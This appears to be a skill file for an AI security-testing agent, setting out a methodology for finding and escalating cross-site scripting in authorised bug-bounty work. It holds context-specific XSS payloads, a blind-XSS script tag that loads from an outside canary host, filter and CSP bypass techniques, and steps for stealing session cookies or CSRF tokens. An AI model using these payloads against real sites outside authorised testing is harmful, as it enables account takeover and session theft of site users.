---
name: xss
description: "Cross-site scripting methodology: reflected, stored, DOM, and blind XSS — context-aware payload selection, CSP and filter bypass, and escalation to session theft / account actions. Auto-loads when user input is reflected into a response or DOM sink, or when xss-hunter is engaged."
---

# XSS

XSS is common but the payout is in the escalation (stored on an authenticated page, admin-viewable, or account takeover), not the `alert(1)`. Deep work goes to `xss-hunter`. Payloads live in the burp-scan steering; this is the decision method. Pairs with evidence-discipline (self-XSS is not a finding), business-impact, safe-exploitation.

---

## 1. FIND THE SINK + ITS CONTEXT (context decides the payload)
Reflect a unique marker (`kXSS7331`) and find where it lands, then pick the break-out for THAT context:
- **HTML body:** `<svg onload=...>` / `<img src=x onerror=...>`.
- **HTML attribute:** break out with `"` or `'` then add an event handler (`" onmouseover=alert() x="`); unquoted attr → space + handler.
- **Inside `<script>`:** break the string/statement (`';alert()//`, `</script><svg onload=...>`).
- **URL/href:** `javascript:` scheme; `srcdoc`.
- **JSON reflected then rendered:** check if it hits `innerHTML` later (DOM).
Record whether the marker is HTML-encoded, JS-string-escaped, or unescaped — that tells you if it's exploitable and how.

## 2. TYPES
- **Reflected:** input echoes in the immediate response. Delivery = a link the victim clicks.
- **Stored:** input persists (profile, comment, filename, support ticket, log viewer) and renders later — higher impact, especially if an ADMIN views it. Test every field that's displayed back, incl. ones rendered in an admin/moderation panel.
- **DOM:** source (`location.hash/search`, `postMessage`, `document.referrer`, `localStorage`) flows to a sink (`innerHTML`, `document.write`, `eval`, `setTimeout`, jQuery `$()`, `element.src`). Use Burp DOM Invader to trace source→sink. No server round-trip needed.
- **Blind:** stored input rendered somewhere you can't see (admin dashboard, logs, internal tool). Confirm with an OOB payload that beacons to your canary (`oob-verification`): `'"><script src=//<canary></script>`.

## 3. BYPASS FILTERS / CSP
- Filter/WAF: case mix (`<ScRiPt>`), no-script vectors (`<svg/onload>`, `<details open ontoggle>`, `<iframe srcdoc>`), event-handler variety, HTML-entity/URL/double encoding, mutation XSS (mXSS) via DOM reparsing, broken tags the sanitizer misparses.
- **CSP:** look for `unsafe-inline`, wildcard/overbroad `script-src`, allow-listed CDNs hosting JSONP/AngularJS gadgets, `nonce` reuse, or a `base-uri`/dangling-markup gap. A strict CSP can sometimes be sidestepped via a same-origin script-gadget or a nested CRLF response-splitting sink (see burp-scan steering).
- Sanitizer bypass: fingerprint the library+version (DOMPurify etc.) and use a known-version bypass; test prototype-pollution → sanitizer-config gadget (see prototype-pollution).

## 4. CONFIRM + ESCALATE (prove real impact)
- Confirm execution: `alert(document.domain)` proves origin; for reports prefer a benign proof that shows capability.
- Escalate to impact: steal the session cookie (only if not HttpOnly) or an anti-CSRF token to your own canary; perform an authenticated action via `fetch` as the victim; for stored+admin, demonstrate it fires in the privileged view. Use YOUR OWN accounts as attacker/victim (safe-exploitation).
- **Self-XSS is not a finding** unless chained (e.g. + CSRF/login-CSRF to force the victim's browser to store it) (evidence-discipline).

## 5. IMPACT + EVIDENCE
- Severity (business-impact): stored XSS on an authenticated/admin page or one that yields ATO = High (sometimes Critical in-context); reflected requiring a click = Medium. Reach (any user? admin? all viewers?) is the multiplier.
- Evidence: the exact request/URL, the reflected+executed marker, and the escalation proof (cookie/token received at canary, or the action performed), redacted. Screenshot the execution.

## FALSE POSITIVES
- Marker reflected but HTML-encoded / in a non-`text/html` response (JSON with no HTML sink) = not exploitable.
- `alert()` firing only in your own devtools/console (self-XSS) with no delivery path.
- Reflection inside an attribute that is properly URL/entity-encoded.
